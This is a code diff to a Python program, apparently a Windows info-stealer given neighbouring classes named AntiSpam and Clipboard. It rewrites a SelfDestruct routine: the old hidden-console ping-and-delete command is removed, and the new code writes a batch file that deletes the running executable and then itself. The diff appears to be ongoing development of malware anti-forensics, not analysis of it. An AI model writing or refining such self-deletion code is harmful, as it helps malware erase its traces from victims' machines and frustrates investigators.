@@ -819,21 +819,25 @@ class AntiSpam:
 
 class SelfDestruct():
     def __init__(self):
-        self.path, self.frozen = self.getfile()
         self.delete()
 
-    def getfile(self):
-        if hasattr(sys, 'frozen'):
-            return (sys.executable, True)
-        else:
-            return (__file__, False)
-
     def delete(self):
-        if self.frozen:
-            subprocess.Popen('ping localhost -n 3 > NUL && del /F "{}"'.format(self.path), shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
-            os._exit(0)
-        else:
-            os.remove(self.path)
+        try:
+            path = sys.argv[0]
+            batch_content = f"""@echo off
+ping 127.0.0.1 -n 2 > nul
+del "{path}"
+ping 127.0.0.1 -n 2 > nul
+del "%~f0"
+"""
+            if os.path.exists(path):
+                batch_path = os.path.join(os.path.dirname(path), "self_delete.bat")
+                with open(batch_path, "w") as batch_file:
+                    batch_file.write(batch_content)
+                subprocess.Popen(batch_path, shell=True)
+            sys.exit()
+        except Exception:
+            sys.exit()
 
 
 class Clipboard:
